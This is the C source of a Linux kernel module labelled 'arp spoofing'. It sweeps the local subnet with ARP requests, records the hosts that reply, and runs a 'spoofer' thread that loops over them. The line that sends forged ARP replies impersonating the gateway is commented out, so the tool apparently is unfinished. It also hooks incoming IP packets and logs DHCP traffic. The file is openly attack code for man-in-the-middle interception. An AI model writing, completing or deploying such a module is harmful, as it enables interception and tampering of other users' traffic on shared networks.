#include "types.h"
#include <linux/kernel.h>
#include <linux/module.h> //module macro
#include <linux/netdevice.h> //struct net_device
#include <linux/inetdevice.h> //struct in_ifaddr
#include <linux/inet.h> //in_aton()
#include <net/neighbour.h> //struct neighbour
#include <linux/sched.h> //struct task_struct
#include <linux/kthread.h> //kthread API
#include <linux/netfilter.h> //netfilter
#include <linux/netfilter_arp.h> //netfilter-ARP
#include <linux/skbuff.h> //struct sk_buff
#include <linux/delay.h> //msleep
#include <net/arp.h> //arp_send()
#include <linux/if_arp.h> //struct arphdr
#include <linux/slab.h> //kzalloc(), kree()
#include <linux/signal.h> //allow_signal()
#include <linux/sched/signal.h> //send_sig()
#include <linux/string.h>

#include <linux/udp.h>

//int sys_ip = inet_select_addr(dev, 0, RT_SCOPE_UNIVERSE);
//inet_ioctl()
//static struct inet_protosw inetsw_array[]
//proc file system, /proc/net/route -> parse

static char * device = NULL;
module_param(device, charp, 0644); //name, type, permission
static char * gateway = NULL;
module_param(gateway, charp, 0644);

static struct adr_info host, gw; //host, gateway address information
static struct adr_info ** others = NULL; //other hosts address information
static struct net_device * netdev = NULL; //selected interface
static struct task_struct * ts = NULL; //for kthread
static struct nf_hook_ops arp_hook_ops; //arp hook operation
static struct packet_type pktype; //ip handler

static unsigned int max, net_ip;

static void mem_free(void)
{
	int idx = 0;
	
	if (!others)
		return;

	for (; idx < max; idx++)
	{
		if (others[idx])
			kfree(others[idx]);
	}
	kfree(others);
}

static int init_device(void)
{
	struct in_ifaddr * addrs = NULL;

	if (!device)
		return -1;

	netdev = dev_get_by_name(&init_net, device);
	if (!netdev)
		return -1;

	//netdev->promiscuity ;
	if (!netdev->ip_ptr)
		return -1;

	addrs = netdev->ip_ptr->ifa_list;
	if (!addrs)
		return -1;

	host.paddr = addrs->ifa_address;
	memcpy(host.haddr, netdev->dev_addr, sizeof(host.haddr));
	max = ntohl(~addrs->ifa_mask);
	net_ip = addrs->ifa_address & addrs->ifa_mask;

	others = kzalloc(sizeof(struct adr_info *) * max, GFP_KERNEL);

	printk("Host: %pI4[%pM]\n", &addrs->ifa_address, netdev->dev_addr);
	return 0;
}

static int init_gateway(void)
{
	unsigned int ip;
	struct neighbour * neigh = NULL;
	extern struct neigh_table arp_tbl;	

	if (!gateway)
		return -1;

	ip = in_aton(gateway);
	neigh = neigh_lookup(&arp_tbl, &ip, netdev);
	if (!neigh)
		return -1;

	gw.paddr = ip;
	//neighbour."ha" is mac address field.
	memcpy(gw.haddr, neigh->ha, ETH_ALEN);

	printk("Gateway: %pI4[%pM]\n", &gw.paddr, gw.haddr);
	return 0;
}

static unsigned int arp_hook(void * priv, struct sk_buff * skb, const struct nf_hook_state * state)
{
	struct arphdr * arp = arp_hdr(skb);
	unsigned char * ptr = (unsigned char *)(arp + 1); //payload	
	unsigned int ip, pos;

	if (ntohs(arp->ar_op) != ARPOP_REPLY)
		goto finish;
	
	ip = *((unsigned int *)(ptr + 6));
	pos = ntohl(ip & ~(netdev->ip_ptr->ifa_list->ifa_mask));

	if (others[pos])
		goto finish;

	others[pos] = kzalloc(sizeof(struct adr_info), GFP_KERNEL);
	others[pos]->paddr = ip;
	memcpy(others[pos]->haddr, ptr, 6);

	printk("Netfilter: %pI4[%pM] is alive\n", &others[pos]->paddr, others[pos]->haddr);

finish:
	return NF_ACCEPT;
}

static int reg_arp_hook(void)
{
	arp_hook_ops.hook = arp_hook; //hook function
	arp_hook_ops.hooknum = NF_ARP_IN; //hooking number
	arp_hook_ops.pf = NFPROTO_ARP; //protocol

	if (!nf_register_net_hook(&init_net, &arp_hook_ops))
		return 0;
	else
		return -1;
}

static void unreg_arp_hook(void)
{
	if (arp_hook_ops.pf == 0) //unregistered
		return;

	nf_unregister_net_hook(&init_net, &arp_hook_ops);
}

//arp_send: type, ptype, dest_ip, *dev, src_ip, *dest_hw, *src_hw, *target_hw
//eth:	source(*src_hw), dest(*dest_hw), proto(*ptype)
//arp:	1, 0x0800
//	4, 6,
//	op(type)
//	sha(*src_hw), sip(src_ip),
//	tha(*target_hw), tip(dest_ip); 

static void scanning(void)
{
	int base = 1, t;
	unsigned int target = 0; //network byte order

	for (; base < max; base++)
	{
		target = (net_ip | (htonl(base)));
		arp_send(ARPOP_REQUEST, ETH_P_ARP, target, netdev,
			0x12345678, netdev->broadcast, host.haddr, NULL);
		msleep_interruptible(1);
	}	
}

static int spoofer(void * ptr)
{
	unsigned int who = 0, t;

	allow_signal(SIGUSR1); //allow interrupt
	scanning(); //scanning thread

	for (; ; who++)
	{
		if (who == max)
		{
			who = 0;
			continue;
		}

		if (kthread_should_stop())
			break;
		if (!others[who])
			continue;
		if (others[who]->paddr == gw.paddr)
			continue;

		//sub_spoofer thread

		//arp_send(ARPOP_REPLY, ETH_P_ARP, others[who]->paddr, netdev,
			//gw.paddr, others[who]->haddr, host.haddr, others[who]->haddr);
		msleep_interruptible(1);
	}
	
	return 0;
}

static int ip_handler(struct sk_buff * skb, struct net_device * dev1, 
			struct packet_type * pktype, struct net_device * dev2)
{
	struct ethhdr * eth = eth_hdr(skb);
	struct iphdr * ip = ip_hdr(skb);

	/*if (!memcmp(eth->h_dest, host.haddr, 6))
		printk("[%pI4, %pM]spoofed packet\n", &ip->saddr, eth->h_source);*/

	if (ip->protocol == IPPROTO_UDP)
	{
		struct udphdr * udp = udp_hdr(skb);
		unsigned short sport = ntohs(udp->source), dport = ntohs(udp->dest);
		
		if (dport == 68) //DHCP client
			printk("DHCP packet\n");
	}
	
	return NF_ACCEPT;
}

static void reg_ip_handler(void)
{
	pktype.type = htons(ETH_P_IP);
	pktype.func = ip_handler;
	dev_add_pack(&pktype);
}

static void unreg_ip_handler(void)
{
	dev_remove_pack(&pktype);
}

int spoof_init(void)
{
	if (init_device() < 0)
		goto init_err;

	if (init_gateway() < 0)
		goto init_err;

	if (reg_arp_hook() < 0)
		goto init_err;

	if (!(ts = kthread_run(spoofer, NULL, "spoofer")))
		goto init_err;

	reg_ip_handler();

	printk("SPOOF MODULE INIT COMPLETE\n");
	return 0;

init_err:
	unreg_arp_hook();
	mem_free();
	return -1;
}

void spoof_exit(void)
{
	if (ts)
	{
		send_sig(SIGUSR1, ts, 0);
		kthread_stop(ts);
	}

	unreg_arp_hook();
	mem_free();
	unreg_ip_handler();

	printk("SPOOF MODULE EXITED\n");
}

module_init(spoof_init);
module_exit(spoof_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("test_kernel");
MODULE_DESCRIPTION("arp spoofing");
